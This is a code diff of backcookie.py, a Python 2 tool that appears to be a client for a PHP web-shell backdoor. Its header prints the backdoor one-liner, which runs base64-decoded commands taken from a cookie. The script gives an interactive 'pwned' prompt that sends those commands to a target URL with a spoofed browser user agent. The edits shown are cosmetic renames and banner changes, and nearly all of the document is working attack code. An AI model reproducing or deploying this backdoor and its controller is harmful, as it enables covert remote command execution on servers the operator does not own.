@@ -10,13 +10,13 @@ import os                                     #
 import sys                                    #
 from sys import argv                          #
 from urllib2 import build_opener, HTTPHandler #
-import optparse 		              #
+import optparse                               #
 ############################################################################
 #                                                                          #
-# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> #
-# It goes with a range from 1 to 0, but you can customize the parameter.   #
-# Example: python backcookie.py http://target.com/shell.php                #
-#                                                                          #
+# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
+# It goes with a range from 1 to 0, but you can customize the parameter.     #
+# Example: python -u backcookie.py http://target.com/shell.php -c name_cokie #
+#                                                                          ###
 # You can change the name of the cookie, in line 37.                       #
 # a value of 1 for the name of your cookie, also in php.                   #
 # Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
@@ -51,14 +51,13 @@ class core:
         
 def Error():
 	print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
-	print "\t\t+    Developed by: @mrjopino      +"
-	print "\t\t+             Sorry :(            +"
+	print "\t\t+             Status              +"
+	print "\t\t+             sorry :(            +"
 	print "\t\t-----------------------------------\n\n"
-	print color.verde + "[-] " + color.rojo  + "Connection error ! \n" + color.rojo
+	print color.verde + "[-] " + color.rojo  + "Connection error !!!\n" + color.blanco
 	exit(0)
 
-
-def backcookie(command,host,cookie,validateCommand,debugLevel=0):
+def backcookie(command,host,cookie,vcmd,debugLevel=0):
 	o = build_opener(HTTPHandler(debuglevel=debugLevel))
 	o.addheaders = [
 		(core.ua, "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1;"),
@@ -66,10 +65,10 @@ def backcookie(command,host,cookie,validateCommand,debugLevel=0):
 	]
 	try:
 		l = o.open(host)
-		Validate = l.headers.values()
+		v = l.headers.values() # v > validate
 	except:
 		Error()
-	if Validate[0] == '0' or validateCommand == "command":
+	if v[0] == '0' or vcmd == "command": # vcmd > validate command
 		print color.azul + l.read().strip() + color.blanco
 	else:
 		Error()
@@ -84,6 +83,7 @@ def shell(host,cookie):
 	print color.verde + "[+] " + color.azul  + "Sometimes it is not positive, but sometimes if!\n" + color.blanco
 
 	while True:
+
 		command = raw_input("pwned:~$ ")
 		if command != "exit": #exit console backcookie
 			backcookie(command,host,cookie,"command")
@@ -97,7 +97,7 @@ def shell(host,cookie):
 			break
 
 def main():
-	parser = optparse.OptionParser("%prog -u <<Host>> -c <<Cookie>>", version="1.1")
+	parser = optparse.OptionParser("%prog -u <<URL>> -c <<Cookie>>", version="1.1")
 	parser.add_option("-u",dest="Host",type="string",help="specify hostname to run on")
 	parser.add_option("-c",dest="Cookie",type="string",help="specify Cookie")
 	(options, args) = parser.parse_args()
